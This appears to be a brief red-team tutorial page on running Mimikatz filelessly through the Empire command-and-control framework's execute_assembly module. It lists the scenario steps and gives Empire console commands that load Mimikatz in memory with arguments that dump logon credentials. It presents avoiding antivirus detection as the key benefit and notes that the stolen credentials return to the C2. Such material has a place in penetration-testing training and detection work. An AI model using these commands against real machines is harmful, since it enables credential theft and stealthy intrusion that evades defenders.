Using execute-assembly with Mimikatz

A conceptual walkthrough of running a .NET tool filelessly via Empire.

Scenario Overview
  • Generate a .NET assembly (e.g., Mimikatz.exe).
  • Establish an Empire agent on the Windows target.
  • Load execute-assembly module in Empire.
  • Set AssemblyPath and Arguments.
  • Execute the assembly in memory.
Key Benefit

Mimikatz functionality is executed without writing its binary to disk, significantly reducing the chances of detection by traditional AV.

Key Takeaway

Using execute-assembly allows for highly stealthy execution of powerful .NET tools like Mimikatz, returning output directly to the C2 without disk interaction.

Empire Console Example
(Empire) > usemodule powershell/management/execute_assembly(Empire: execute_assembly) > set AssemblyPath /path/to/Mimikatz.exe(Empire: execute_assembly) > set Arguments "privilege::debug sekurlsa::logonpasswords"(Empire: execute_assembly) > execute
Output: Mimikatz results (e.g., dumped credentials) returned to Empire console.
